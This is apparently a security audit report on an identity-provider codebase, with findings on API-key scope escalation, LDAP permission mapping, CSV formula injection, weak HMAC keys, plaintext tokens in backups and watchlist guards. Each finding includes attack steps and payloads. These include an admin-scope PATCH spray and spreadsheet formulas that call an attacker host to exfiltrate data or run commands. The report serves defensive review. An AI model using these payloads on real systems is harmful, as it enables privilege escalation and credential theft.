title: PATCH /api/v1/api-keys/{id} lets an api_keys:write key grant any key - including itself - '*' or 'admin' scopes
description: The API route that rewrites an existing API key's scope set validates only that every requested scope is a known scope (isApiScope). It never compares the requested set against the scopes the calling key holds. The console twins (POST /admin/api-keys and POST /admin/api-keys/:id/edit) both reject 'You cannot give a key permissions you do not hold'; the API twin omits that check entirely, so a deliberately narrow api_keys:write key - the scope intended for delegated key management - can PATCH any live key's scopes to ["admin"] or ["*"], including its own row, and become a full administrator on its next request.
root_cause: src/api/applications.ts:232-243 (PATCH /api/v1/api-keys/{id}) runs `requested.filter((s) => !isApiScope(s))` as the only authority check and then calls updateKey (src/services/platform.ts:22-28), which validates existence/revocation but likewise performs no held-scope comparison. The console equivalent applies `requested.filter((p) => (p === '*' ? !mine.isSuper : !grants(mine.perms, p)))` at src/routes/admin.ts:3893-3896 and 3953-3956; the API path has no equivalent.
intended_behavior: Minting authority is admin-only (POST /api/v1/api-keys requires the 'admin' scope, src/routes/api.ts:1187), and the console enforces 'a key carries only permissions its creator holds'. Editing an existing key's scopes should be bounded by the acting key's own scopes in exactly the same way.

trace.description: Route admits any caller holding api_keys:write - a narrow delegated scope an admin can mint for key-management automation.
requested scopes are checked only with isApiScope - 'admin' and '*' both satisfy it (API_SCOPES contains 'admin'; isPermission('*') is true). No comparison against the actor's own scopes.
Persists the new scope set via updateApiKey (src/lib/api-keys.ts:137-139). Next request by that key resolves with the new scopes via verifyApiKey + hasScope.

evidence.description: `const invalid = requested.filter((s) => !isApiScope(s));` - the only validation of the requested scope set; no grants() check against the caller.
Console create path: `const beyond = requested.filter((p) => (p === '*' ? !mine.isSuper : !grants(mine.perms, p)));` - the invariant the API omits.
Console edit path repeats the same held-permission cap.
POST /api/v1/api-keys requires permission 'admin' - the design already treats scope-minting as admin authority; PATCH bypasses that gate.
updateApiKey writes opts.scopes verbatim; WHERE clause checks only existence and non-revocation.

conditions.description: Caller presents a live API key whose scopes include api_keys:write - a deliberately delegatable, non-admin scope (permission matrix AREAS row 'api_keys').
Target key id must exist and not be revoked; ids are sequential, and PATCHing ids 1..N with scopes ["admin"] upgrades every live key including the attacker's own (no need to know its id).

execution.attacker_perspective: Holder of a minted API key scoped only api_keys:write (e.g. delegated 'manage keys' automation), or any role/key able to mint such a key.
payloads: PATCH /api/v1/api-keys/{id} body {"name":"x","scopes":["admin"]}
spray variant: same body for id = 1..50 to upgrade every live key including the caller's own
instructions: As an admin, mint a key with scopes ["api_keys:write"] (console or POST /api/v1/api-keys).
Using that key, send PATCH /api/v1/api-keys/1 with body {"name":"probe","scopes":["admin"]}; repeat for ids 2..N until {ok:true} is returned.
If the caller's own key id is known (e.g. it also holds api_keys:read and can list), PATCH that id once; otherwise spray all ids - the caller's own row is upgraded too.
Issue any admin-scoped request (e.g. POST /api/v1/api-keys mint, GET /api/v1/backup) with the same token: it now succeeds.
execution.observed_result: Source-verified: the handler performs no held-permission check; updateApiKey stores ["admin"], and hasScope(expand(["admin"]), anything) is true on the next request.

remediation.strategy: Apply the same cap the console uses inside the service so no caller can forget it: in updateKey (or the PATCH handler), compute the acting principal's granted permissions (apiCtx actor scopes expanded; consoleCtx access perms) and reject any requested scope not granted - '*' only when the actor is a Super Admin / holds 'admin'. Also consider requiring 'admin' for scope changes entirely, matching the mint route.

likelihood.reason: Needs a minted api_keys:write key - a deliberately delegated scope meant for key management - then one or a handful of ordinary PATCH calls; no race, no user interaction, blind id spray works.

impact.reason: Full administrative authority over the IdP: mint further keys, backup export (password hashes, encrypted secrets), directory writes, SCIM repointing, signing-key rotation - persisted beyond revocation of the caller's original scope.

confidence.reason: Direct source read of both the missing check and the console invariant it contradicts; the scope algebra (isApiScope, expand, grants) is verifiable in src/lib/permissions.ts.

title: OpenAPI `body`/`query` zod schemas on /api/v1 routes are documentation only - no validation middleware runs, and readJson type-asserts the raw body
description: defineRoute (src/api/openapi.ts:180-213) registers each route's zod `body`/`query`/`params` schemas into the generated OpenAPI document but wires only `requireScope` and `assumeJson` as middleware - the hono zod validator is never attached (the code comment at :210-212 admits the typed machinery is 'bypassed rather than satisfied'). Handlers then call readJson/readOptionalJson (openapi.ts:219-235), which JSON.parse-casts with `as T`. So the published contract claims fields like `permissions: string[]` or `members: string[]` are validated when nothing enforces them. A sweep of the ~77 readJson call sites found no security-impacting miss today: handlers uniformly coerce (`String()`, `=== true`, `param()` strings) and/or defer to service-layer validation (normalizeRole's held-permission + known-permission checks at services/access.ts:147-155, assertRuleAllowed/parseRule, validateBundle for directory import, zod parse in api/ldap.ts). The residual risk is (a) unhandled type confusion - e.g. `permissions` supplied as a string crashes `.filter` into a 500 instead of the documented 400 - and (b) any future field that assumes declared-shape validation will silently accept attacker-shaped input, the same class the api-keys held-scope finding exploited elsewhere.
root_cause: src/api/openapi.ts:212 calls `api.openapi(route, handler)` without the zod-openapi validation middleware, and readJson at :221 asserts rather than parses with the declared schema - the schema exists only for spec generation.
intended_behavior: The declared request schemas should be enforced at the edge of each handler (zodValidator on spec.body/spec.query/spec.params), so the OpenAPI document is a contract rather than a suggestion.

trace.description: Only requireScope + assumeJson are pushed - spec.body never becomes a validator.
`(await c.req.json()) as T` - any shape reaches the handler regardless of the documented schema.

evidence.description: Inline comment: 'the typed response machinery of openapi() is bypassed rather than satisfied'.
Example: POST /api/v1/security/roles declares `permissions: z.array(z.string())`; the handler passes body.permissions (unchecked) into normalizeRole, which assumes an array.
Service-layer validation is the real gate (isPermission + held-permission checks) - protection exists, just not at the declared layer.

conditions.description: Latent: becomes a security bug the first time a handler trusts a declared shape (array vs scalar, enum, integer range) that no layer re-checks.

execution.attacker_perspective: Any authenticated API caller.
payloads: POST /api/v1/security/roles {"name":"x","permissions":"*"} - string instead of array
instructions: Send a schema-violating body (wrong types, missing required fields) to any /api/v1 route.
Observe: no 400-with-schema-detail; the handler processes it or throws a generic 500.
execution.observed_result: Documented validation is absent; malformed input reaches service code.

remediation.strategy: Attach zodValidator(spec.body/spec.query/spec.params) in defineRoute, or have readJson accept the zod schema and parse rather than assert.

code_changes.fixed_code: middleware.push(zodValidator('json', spec.body)) for declared bodies; readJson<T>(c, schema) => schema.parse(await c.req.json()).

likelihood.reason: Every route accepts off-schema input; the concrete security miss is latent pending a trusting handler.

impact.reason: Current handlers re-validate at the service layer; observed consequence today is wrong-status 500s and a misleading public contract.

confidence.reason: Absent validation middleware and the assert-only readJson are directly verified; the 'no exploit today' conclusion is bounded by a full sweep of readJson call sites.

title: LDAP API routes are gated on legacy conjunction scopes (clients:write/directory:read/settings:write), not the ldap:* permission area - parity break plus bind-secret reveal outside its area
description: The permission model has an 'ldap' area (AREAS, src/lib/permissions.ts:17) and the console gates /admin/ldap under ldap:read/ldap:write (PATH_AREAS, src/lib/admin-roles.ts:76-77), but the /api/v1/ldap/* routes require legacy scopes: GET routes 'directory:read', app writes 'clients:write', settings writes 'settings:write'. Two consequences. (a) A key holding ldap:write - the permission an operator would mint for LDAP automation - is denied every LDAP route, while a role holding it gets the console pages: an unusable permission on the API. (b) Under grants() a required legacy scope is satisfied by holding ALL of its expansion (src/lib/permissions.ts:70-72), so 'clients:write' demands oidc:write+saml:write+federation:write - a key minted for application/client management, with no ldap authority, can create LDAP apps, rotate and REVEAL their generated bind secrets (POST /api/v1/ldap/apps/{slug}/reveal), and POST /api/v1/ldap/settings is reachable by settings:write (security+branding+email+scim+schemas write). [Merged duplicate record(s): h-ldap-02.]
root_cause: src/api/ldap.ts registers its routes with permission strings 'directory:read' (GET /ldap/apps, GET /ldap/settings), 'clients:write' (POST/DELETE apps, rotate, reveal) and 'settings:write' (POST /ldap/settings) instead of 'ldap:read'/'ldap:write'. Every other v1 route family uses its own area permission.
intended_behavior: The ldap permission area exists precisely to scope LDAP authority: routes should require ldap:read for reads and ldap:write for mutations, matching the console mapping and the permission matrix.

trace.description: All routes declare legacy scope strings as their permission ('directory:read' :110/:200, 'clients:write' :122/:149/:160/:172, 'settings:write' :209) instead of the ldap area.
A required legacy scope is satisfied by holding every permission it expands to: clients:write <- oidc:write+saml:write+federation:write; settings:write <- security+branding+email+scim+schemas write.
Reveals the app's generated bind secret to a caller whose mandate was OIDC/SAML/federation client management - a credential disclosure outside the ldap area.

evidence.description: Console maps /admin/ldap to the 'ldap' area - the permission key exists and is used on one surface.
LEGACY_SCOPES['clients:write'] = [oidc:write, saml:write, federation:write] - no ldap permission anywhere in the expansion.
LEGACY_SCOPES['settings:write'] = [security:write, branding:write, email:write, scim:write, schemas:write].
AREAS includes { key: 'ldap' } - a first-class permission area that no API route consumes.

conditions.description: Caller holds the clients:write legacy scope or an equivalent conjunction (all of oidc/saml/federation write), or settings:write for the settings route.
At least one LDAP app exists for the reveal path; creation/rotation work without one.

execution.attacker_perspective: Application-integrations key (clients:write or equivalent) operating provisioning automation - no ldap grant intended.
payloads: POST /api/v1/ldap/apps {slug, bind groups}
POST /api/v1/ldap/apps/{slug}/reveal
POST /api/v1/ldap/settings {...}
instructions: Mint a key with the clients:write legacy scope (documented as the client-registration scope).
POST /api/v1/ldap/apps to register an app; POST /api/v1/ldap/apps/{slug}/reveal to recover its bind secret.
Observe the converse: a key holding ldap:write (the console's LDAP permission) gets 403 on every one of these calls.
execution.observed_result: Source-verified permission declarations; no ldap:* string appears in src/api/ldap.ts.

remediation.strategy: Re-map the routes to their area: 'ldap:read' on GETs, 'ldap:write' on mutations (apps create/rotate/reveal/delete, settings POST). If backward compatibility for the legacy scopes matters, extend LEGACY_SCOPES mapping deliberately rather than per-route.

likelihood.reason: Any clients:write key holder reaches it with a single POST; the scope is a documented delegation for client registration.

impact.reason: Disclosure of live LDAP bind secrets (directory read credential on the LDAP interface) and unsanctioned LDAP app/policy changes outside the operator's intent; the symmetric denial of ldap:* keys is an availability/parity break.

confidence.reason: Permission strings and the grants() expansion semantics are directly readable; no runtime check needed.

title: Audit CSV export lacks spreadsheet-formula escaping - attacker-controlled user_agent/target/details fields become formulas when an admin opens the export
description: GET /api/v1/audit/export?format=csv builds cells with `esc = (v) => '"' + String(v ?? '').replace(/"/g, '""') + '"'` - correct quote escaping, but no protection against values that begin with =, +, -, @, tab or CR. Audit rows carry anonymously controlled data: user_agent on every request (up to 512 chars, set arbitrarily on a failed login or token call), target (e.g. the username supplied on failed sign-ins, up to 256 chars), and details (JSON up to 4 KB containing echoed remote strings). A field starting '=HYPERLINK(...)' or '=cmd|...' is live when an auditor opens the CSV in Excel/LibreOffice - a stored, anonymous-to-admin injection channel.
root_cause: src/api/monitoring.ts:173 escapes only the double-quote for CSV structural safety; it does not prefix or neutralise leading formula characters on fields that originate from unauthenticated clients.
intended_behavior: Security-log exports routinely defuse formula cells (prefix a single quote or a leading apostrophe/tab rule) because log content is attacker-influenced by design; the export should not render as a spreadsheet-executable artifact.

trace.description: Anonymous requests plant user_agent (headers), ip and attacker-shaped target/details rows in audit_log.
Quote-doubling only; no formula-leader neutralisation.
text/csv attachment the operator opens in a spreadsheet.

evidence.description: esc only doubles quotes; leading = + - @ \t \r survive verbatim into the cell.
user_agent is stored (bounded to 512) from the request's User-Agent header - fully attacker-controlled.
Exported columns include user_agent, ip, details and target - all attacker-influenced.

conditions.description: An audit:read holder exports CSV and opens it in a spreadsheet application that executes formulas.
None required to plant the payload - a single anonymous request with a crafted User-Agent suffices.

execution.attacker_perspective: Anonymous internet client planting rows; victim is the admin who exports and opens the CSV.
payloads: User-Agent: =HYPERLINK("https://attacker.example/exfil?cell="&A2,"click")
User-Agent: =cmd|'/c calc'!A1
username on failed login: =DDE("cmd","/c calc","")
instructions: Send any request (e.g. failed /login POST or /token call) with a formula-leading User-Agent or username.
Wait for an auditor to run GET /api/v1/audit/export?format=csv and open it in Excel/LibreOffice.
The cell executes the formula on open.
execution.observed_result: Source-verified: no formula escaping exists in the CSV serializer; the injected text is stored verbatim by insertAudit.

remediation.strategy: In the CSV serializer, prefix a single quote (or wrap as ="...") when a value matches /^[=+\-@\t\r]/ - the same treatment applied to log exports generally. Apply to the ndjson path too only if a downstream consumer converts it; CSV is the reachable surface.

code_changes.fixed_code: const esc = (v: unknown) => { const s = String(v ?? ""); const safe = /^[=+\-@\t\r]/.test(s) ? `'${s}` : s; return `"${safe.replace(/"/g, '""')}"`; };

likelihood.reason: Trivial to plant; depends on the routine admin workflow of exporting CSV and opening it in a spreadsheet.

impact.reason: Executes a formula in the operator's spreadsheet context - data exfiltration or (for DDE/cmd vectors) local command execution with explicit-user-consent prompts on modern Excel.

confidence.reason: Serializer and field provenance are directly readable; standard CSV-injection class.

title: Sealed login-flow HMAC key still derives from the first non-empty of three secrets; a >=32-char placeholder or weak value is accepted (prior record: changed, not fully fixed)
description: Revalidation of run-1 fingerprint authorize-state:flowSealKey-placeholder-secret-shadowing. flowSealKey (src/lib/authorize-state.ts:114) still picks the first non-empty of SIGNING_KEY_PKCS8, COOKIE_ENCRYPTION_KEY, KEY_ENCRYPTION_KEY - the same shadowing order the prior record flagged - and still refuses nothing except a value shorter than 32 characters (line 117). The codebase's own convention, isPlaceholderSecret (src/lib/api-auth.ts:70, 'replace-me' prefix, enforced for BOOTSTRAP_TOKEN and for KEY_ENCRYPTION_KEY at setup.ts:58-62), is not applied to any of the three candidates. Two gaps keep the prior concern alive: (1) COOKIE_ENCRYPTION_KEY is an undocumented legacy secret (only declared at env.ts:30, used only here) that shadows KEY_ENCRYPTION_KEY and is never placeholder- or strength-checked anywhere; (2) the setup gate checks isPlaceholderSecret only on KEY_ENCRYPTION_KEY, so a deployment whose SIGNING_KEY_PKCS8 is a >=32-char placeholder/weak value passes setup while it becomes the sealed-flow MAC key - and, via the identical derivation in signing-keys.ts:36/sealed.ts:16, the KEK for sealed signing keys and app secrets. The >=32 length gate added since run-1 does close the shortest-placeholder case, and a Deploy-to-Cloudflare click-through that leaves KEY_ENCRYPTION_KEY=replace-me-* is blocked at /setup, so the residual is narrower than the original record. [Merged duplicate record(s): h-oidc-05.]
claimed_root_cause: flowSealKey trusts whichever of three optional secrets is non-empty first and applies only a length>=32 check; it does not apply isPlaceholderSecret (the codebase's documented placeholder convention) and the setup gate placeholder-checks only KEY_ENCRYPTION_KEY, leaving a weak-but-long SIGNING_KEY_PKCS8 or COOKIE_ENCRYPTION_KEY usable as the sealed-flow HMAC key.

trace.description: MAC material = env.SIGNING_KEY_PKCS8 || env.COOKIE_ENCRYPTION_KEY || env.KEY_ENCRYPTION_KEY; only material.length < 32 is refused.
Sealed flow ids (prefix 's.') carry the full PendingAuthorizeRequest - including the allowlisted-at-seal-time redirect_uri - protected only by this HMAC.

Issuance trusts flow.request.redirectUri from the opened flow with no second redirectUriAllowed check; a forged sealed flow therefore places an authorization-code redirect on an attacker-chosen URI for a valid client.

evidence.description: if (!material || material.length < 32) return null - a length-only gate; values of 32+ characters, including 'replace-me-*' placeholders and low-entropy strings, become the HMAC key.
The setup-time placeholder refusal covers only KEY_ENCRYPTION_KEY; SIGNING_KEY_PKCS8 merely has to be non-empty to satisfy the gate, and COOKIE_ENCRYPTION_KEY is not consulted at all.

COOKIE_ENCRYPTION_KEY is declared but undocumented (absent from .dev.vars.example, wrangler.jsonc and docs); an operator who sets it weak gets sealed flows MACed by that weak value even with a strong KEY_ENCRYPTION_KEY present.

blockers: The decisive fact is a deployment's actual secret values: whether SIGNING_KEY_PKCS8 or COOKIE_ENCRYPTION_KEY (or a post-setup-rotated KEY_ENCRYPTION_KEY) is set to a placeholder or otherwise low-entropy string of length >= 32. The source shows the check that would miss it, not that any real deployment has such a value.

validation_plan.local: Set SIGNING_KEY_PKCS8='replace-me-0000000000000000000000000000' (>=32 chars) in .dev.vars, confirm /setup completes (the gate only checks KEY_ENCRYPTION_KEY), then POST /authorize for a registered client and verify flowSealKey derives a key from the placeholder: forge a sealed flow by recomputing HMAC-SHA256 over 'flareid login-flow seal v1\n<placeholder>' and confirm getLoginFlow accepts it (openSealedFlow returns the forged flow).
validation_plan.deployment: Operator check: `npx wrangler secret list` and inspect whether SIGNING_KEY_PKCS8/COOKIE_ENCRYPTION_KEY/KEY_ENCRYPTION_KEY hold shipped or otherwise weak values of length >= 32; also confirm whether COOKIE_ENCRYPTION_KEY is set at all, since it shadows KEY_ENCRYPTION_KEY silently.

title: Watch flag/unflag endpoints skip the admin-account guard - a cfone:write API key or console role can flag and unflag admin-role holders, the exact boundary every other user-mutating path enforces
description: The codebase's stated invariant (services/guards.ts, routes/admin.ts middleware) is that below Super Admin / an admin-scoped API key, nobody may act on an account holding an admin role - assertMayTouchUser() exists for exactly this and user-targeting services call it. The risk-watchlist writes go through no service and call flagUser/unflagUser directly: PUT/DELETE /api/v1/users/{username}/watch (api/cfone.ts:113-140) need only cfone:write - a mintable non-admin permission - and never check the target's roles. The console equivalents are equally unguarded: POST /admin/integrations/cf-one/watch and /watch/:uid/remove (admin.ts:3205-3223) match neither the /admin/users/* regex in the admin-role middleware (admin.ts:199) nor a role-group path, and the form's user_id field is not among the inspected group_ids/add_group_ids fields. So a delegated cfone role or key can flag a Super Admin (pushing them onto the risk watchlist -> SCIM/CF One downstream enforcement, potentially tightening or blocking their own sign-in at the edge) or - worse - clear an existing flag on an admin account, erasing detection another administrator set.
root_cause: api/cfone.ts:113-140 and routes/admin.ts:3205-3223 call flagUser/unflagUser without assertMayTouchUser or an isAdminActor check; the admin-role middleware regex only covers /admin/users/{id}/* paths and body fields group_ids/add_group_ids (admin.ts:199-208), which the CF One watch form avoids.
intended_behavior: Per guards.ts and the architecture's 'non-admin keys barred from admin-role holders': writing a watch flag on an account holding an admin role should require the same privilege (Super Admin / admin-scoped key) the rest of the codebase demands for acting on such accounts.

trace.description: permission: 'cfone:write' - mintable non-admin scope; resolves the user and calls flagUser directly.
Console paths under /admin/integrations/cf-one - the admin-role middleware's /admin/users/* regex and group_ids field scan do not see the user_id form field.
userMatch regex /^\/admin\/users\/([^/]+)(\/|$)/ - /admin/integrations/cf-one/watch never matches; form fields checked are group_ids/add_group_ids only.
Writes user_watch + watchlist group_members and immediately SCIM-pushes the target - no role check on the affected account.

evidence.description: permission: 'cfone:write' on the flag route; the handler only checks a reason is present - no admin-account test.
DELETE /api/v1/users/{username}/watch clears the flag with the same low bar.
assertMayTouchUser is the canonical check other user mutations apply ('Changing an account that holds an admin role needs a Super Admin'); the watch paths never call it.
flagUser calls pushUsersById - the forged/cleared flag propagates to SCIM targets immediately.

conditions.description: Caller holds cfone:write (API key scope or console role) but not super-admin/admin scope - exactly the delegated tier the invariant constrains.

execution.attacker_perspective: Holder of a delegated Cloudflare One integration credential (API key scoped cfone:write, or a console admin role granted the cfone area) - below the trust the rest of the codebase requires to touch admin accounts.
payloads: PUT /api/v1/users/{super-admin-username}/watch { reason: 'x' }
DELETE /api/v1/users/{super-admin-username}/watch
POST /admin/integrations/cf-one/watch with user_id=<admin id> (console role)
instructions: Mint/hold a cfone:write API key.
Flag a Super Admin - observe user_watch + group_members gain them and pushUsersById runs.
Or clear an existing flag on an admin account - the row and group membership are removed without the guard that protects every other admin-targeted write.
execution.observed_result: Watch flags on admin-role holders can be set and cleared by a principal the codebase's own guards classify as not allowed to act on such accounts.

remediation.strategy: Apply the invariant: in the api/cfone.ts watch handlers and the admin.ts CF One watch handlers, run the target through the same check - assertMayTouchUser (services path) or an accessFor(...).isAdmin gate requiring an admin-scoped actor (isAdminActor / isSuperAdmin) - before flagUser/unflagUser.

likelihood.reason: Requires a delegated cfone credential - plausible tier for an integrations key; once held, the action is a single call.

impact.reason: Detection-control manipulation on the most privileged accounts: clearing an admin's flag erases downstream enforcement without the required privilege; flagging an admin pushes them into edge-level blocking lists - real but confined to the watchlist control.

confidence.reason: Handler permissions, the middleware regex coverage, and the guard the rest of the codebase uses are all read directly.

title: Cloudflare One API token (Zero Trust Edit on the linked CF account) stored plaintext in idp_settings and exported verbatim into every backup bundle and daily R2 snapshot
description: saveCfOne() writes cfone.api_token as raw text into idp_settings - no sealText() call - even though src/lib/sealed.ts exists and is used for LDAP app secrets (ldap/apps.ts) and signing keys. exportDatabase() then SELECTs every table including idp_settings, so GET /api/v1/backup (admin scope) returns the live CF API token in cleartext inside the bundle, and the daily snapshotToR2() writes the same plaintext JSON to the optional R2 bucket. The token is documented to need 'Zero Trust: Edit' - a single disclosed backup file, R2 object listing, or D1 console read yields control over the entire linked Cloudflare account's Zero Trust configuration, far beyond the IdP itself. The pre-existing scim_targets.secret column has the same pattern (migrations/0034_scim_targets.sql:13, scim-targets.ts:187) - the new cfone code copied the weakest precedent instead of the sealing mechanism the codebase already has.
root_cause: src/lib/cfone.ts:66-77 saveCfOne() persists the token via a plain INSERT INTO idp_settings; src/lib/backup.ts:30-37 and :157-163 replicate it into export bundles and unencrypted R2 snapshots.
intended_behavior: Secrets at rest should be sealed under KEY_ENCRYPTION_KEY like other stored credentials (ldap app secrets, signing keys), so a database dump or R2 object alone does not disclose the credential.

trace.description: cfone:write caller submits api_token.
pairs.push(['cfone.api_token', input.apiToken]) written to idp_settings.value as plaintext - no sealText.
Whole-table SELECT * includes idp_settings -> token in cleartext inside the bundle.
BACKUPS.put('backups/<date>.json', JSON.stringify(bundle)) - plaintext JSON, no application-layer encryption, containing the live token.

evidence.description: apiToken pushed into idp_settings verbatim; cfApi sends it as a Bearer credential to api.cloudflare.com (line 87).
sealText/unsealText exist and are used for LDAP secrets (ldap/apps.ts:82,90) - sealing was available but not applied here.
SELECT * FROM "${name}" over every table - idp_settings (and scim_targets) included in the export.
Export documented as containing 'everything an attacker would want' and gated on the top 'admin' scope - plaintext external credentials widen the bundle's blast radius beyond the IdP.

conditions.description: Requires the Cloudflare One connection to be configured with an api_token; R2 exposure requires the optional BACKUPS binding.
Export requires an admin-scoped API key; R2/D1 access are operator-tier - the finding is that the credential survives in cleartext on all three surfaces.

execution.attacker_perspective: Anyone who obtains a backup bundle, reads the R2 bucket, or reads the D1 database - a tier below 'holds the CF API token', which the storage design was meant to protect.
payloads: Read idp_settings.value WHERE key='cfone.api_token', or read backups/<date>.json from R2
instructions: Configure cfone via PUT /api/v1/integrations/cloudflare-one with a real token.
Export GET /api/v1/backup or read the R2 snapshot; grep for cfone.api_token - the cleartext token is present.
Use it directly against https://api.cloudflare.com/client/v4 as Authorization: Bearer.
execution.observed_result: The Zero Trust Edit token for the linked Cloudflare account is recoverable in cleartext from backup/R2/DB surfaces.

remediation.strategy: Seal the token at rest like the other stored secrets: write sealText(env, token) into a cfone.api_token_enc setting, unseal in getCfOne, and migrate existing rows. Apply the same to scim_targets.secret (pre-existing same-pattern debt). Optionally exclude *_enc columns or scim_targets.secret handling need no change since sealed blobs are safe in bundles.

code_changes.fixed_code:

title: Watchlist flag upsert downgrades a manual 'until cleared' flag to a 24h auto flag - a flagged user (or anyone failing their login) can wash a deliberate risk flag off the Risk watchlist
description: flagUser() upserts user_watch ON CONFLICT(user_id) DO UPDATE SET reason, source, expires_at. Any later flag - the auto:fails flag written by POST /login after 10 failed sign-ins in an hour, or an SSF transmitter's risk event - overwrites an existing permanent (expires_at IS NULL) manual flag with an expiring one. The hourly sweepWatchlist() then deletes the lapsed row and reconcileWatchlist() removes the user from the 'Risk watchlist' system group, dropping them from every downstream consumer (Cloudflare One gateway list, SCIM-synced group) without any administrator clearing the flag. The flagged user can do this to themselves: fail their own password step 10 times over ~30 minutes and the manual flag an admin meant to persist evaporates a day later. The same path lets an anonymous internet caller (a) flag an arbitrary known account onto the risk watchlist, and (b) overwrite a manual permanent flag on it - only the victim's username is needed. Automatic flags also write no audit_log row at all (only the login.failed rows exist), so the flag change is not attributed.

title: redact-exports.mjs only replaces literal secret strings; secrets appearing in encoded form in suite exports would survive the scrub
description: The conformance-results scrub works by collecting the cleartext values of secret-looking keys from suite-config.json plus CONFORMANCE_TOKEN, then doing literal split/join replacement over each exported file (conformance/redact-exports.mjs:56-71). That catches verbatim occurrences - including the client_secret_post and form-posted traffic - but not encoded forms of the same secrets. The OIDF suite exports raw HTTP request/response material; where the test client authenticates with client_secret_basic, the Authorization: Basic header carries base64(client_id:client_secret), which never contains the literal secret string. A base64-encoded client_id:client_secret in an export would therefore persist in the 14-day artifact undetected. Whether the exports actually contain that header is suite-version behaviour that cannot be settled from this repository alone - the pinned suite commit (23353b36957d6466010de767c812d2c91ed37638) is an external tree.
claimed_root_cause: redact-exports.mjs:66 performs `next.split(s).join("<redacted>")` - exact-substring replacement with no handling of base64/hex/URL-encoded or JSON-escaped representations of the collected secrets, so any non-literal rendering of a secret survives the scrub.

trace.description: collectSecrets gathers cleartext values under /secret|password|token/ keys (plus CONFORMANCE_TOKEN) - the values themselves, not their encodings.
`next.split(s).join("<redacted>")` - literal substring replacement only.
Whatever survives the scrub is uploaded as the conformance-results artifact for 14 days; Basic-auth exports would carry base64(client_id:client_secret) untouched.

evidence.description: Exact-substring replacement loop - the only scrub mechanism.
Comment scope: the script deliberately targets 'the material that authenticates' (client secrets, password, CONFORMANCE_TOKEN) - encoded renderings of the same material are within that intent.

The config registers client/client2/client_secret_post - the suite is exercised under both client_secret_basic and client_secret_post, so Basic Authorization headers containing the encoded secret are expected traffic.

blockers: Whether the pinned OIDF suite's --export-dir output actually embeds HTTP Authorization headers (or other encoded renderings of client secrets) is behaviour of the external conformance-suite tree at commit 23353b36957d6466010de767c812d2c91ed37638, not of this repository; no exported sample is in-repo.
An offline check needs the suite's export format; the decisive in-repo question is only whether the literal replacement is sufficient, which it is not in the general case.

Any encoded occurrence surviving redact-exports.mjs confirms the gap.
validation_plan.deployment: Alternatively the owner can grep a real downloaded conformance-results artifact for base64(<client_id>:) and for the client secret in urlencoded/base64 form - a single run answers it.

title: Replace-mode directory import deletes system groups (the 'Risk watchlist') and queues their remote deprovisioning - the keep-list is name-keyed and ignores groups.system
description: replaceExistingDirectory (directory-import.ts:223-262), the 'replace' path behind directory import, decides which groups survive purely by name: keepGroups = [...adminRoleGroupNames, 'All Employees'] (line 230), and doomedGroups / the DELETE use `WHERE name NOT IN (json_each(keepGroups))` (lines 242, 256). The groups.system flag is never consulted, so the Cloudflare One 'Risk watchlist' system group (groups.system = 'watchlist', cfone.ts:284-289) - whose whole purpose is machine-maintained membership mirroring user_watch - is swept into doomedGroups on every replace import. Two consequences: (a) the groups row and, via ON DELETE CASCADE, all group_members rows for the watchlist are destroyed; (b) scimDeprovisionStatementsForMany('group', ...) queues a remote DELETE for the group on every linked outbound SCIM target (lines 247-250), so connected IdPs/apps lose the watchlist group too. user_watch rows survive (separate table), so the local risk flags persist, and flagUser recreates the group on the next flag (ensureWatchlistGroup, cfone.ts:292-301) - but until then reconcileWatchlist early-returns on the missing group (cfone.ts:334-336), remote targets retain their deprovisioned state until a new group is pushed, and scim_group_links/scim_group_state rows for the old id are gone (cascade), so the recreated group appears as a brand-new object downstream rather than an update of the old one. The service layer's own invariant - 'a system group and cannot be deleted' (services/groups.ts:150) - is bypassed because the import wipes by name rather than honoring the flag.
root_cause: replaceExistingDirectory keeps groups by name only ([...adminRoleGroupNames, 'All Employees']) and never excludes `system != ''` rows from doomedGroups or the DELETE WHERE clause - the system flag added in migration 0040 postdates the name-keyed keep-list convention and was not incorporated.
intended_behavior: A destructive replace should still preserve feature-internal system groups the way it preserves admin-role groups: exclude `groups.system != ''` rows from doomedGroups (so they are neither deleted nor queued for remote deprovisioning), keeping the name-keyed exceptions only for the historical built-ins.

trace.description: Directory import in replace mode (import:write-scoped API key or the console import action) calls replaceExistingDirectory to wipe the current directory.
Survivors are enumerated by name: admin role group names plus 'All Employees'. `groups.system` is not part of the predicate.
SELECT * FROM groups WHERE name NOT IN (...) - the watchlist row ('Risk watchlist', system='watchlist') is selected for destruction.
For every linked outbound SCIM target a remote group DELETE is queued - the watchlist group is deprovisioned downstream, not just locally.

trace.scope: DELETE FROM groups WHERE name NOT IN (...)
trace.description: The watchlist groups row is deleted; group_members rows cascade away (migrations/0001_schema.sql:70 ON DELETE CASCADE), erasing the membership mirror until the next flag/sweep rebuilds it.

evidence.description: keepGroups is a name list only; no system-flag predicate anywhere in replaceExistingDirectory.
doomedGroups selects every group whose name is not in the keep list - 'Risk watchlist' qualifies.
DELETE FROM groups WHERE name NOT IN (...) runs in the same batch as the remote-deprovision queue.
watchlistGroup() finds the group by system='watchlist'; after a replace-import wipe it returns null and reconcileWatchlist (line 335) does nothing until flagUser recreates the row (line 292-301).
The invariant the import bypasses: system groups 'cannot be deleted' on every service-layer path.

The CF One watchlist group must exist (created on first flag) or another feature must introduce a groups.system marker. Remote deprovisioning requires a SCIM target with a link row for the group.

execution.attacker_perspective: An import:write-scoped API key holder (or an admin running a replace-mode import who does not intend to destroy the watchlist).
payloads: POST /api/v1/import (or console replace import) with a users/groups bundle and mode=replace
instructions: Ensure a flag exists (e.g. an account on the watchlist) so the 'Risk watchlist' group row is present.
Run a replace-mode directory import.

title: federation:write (a delegable, non-admin permission) can register an arbitrary upstream IdP that adopts any local account by unverified email/UPN claim, minting a session as that user
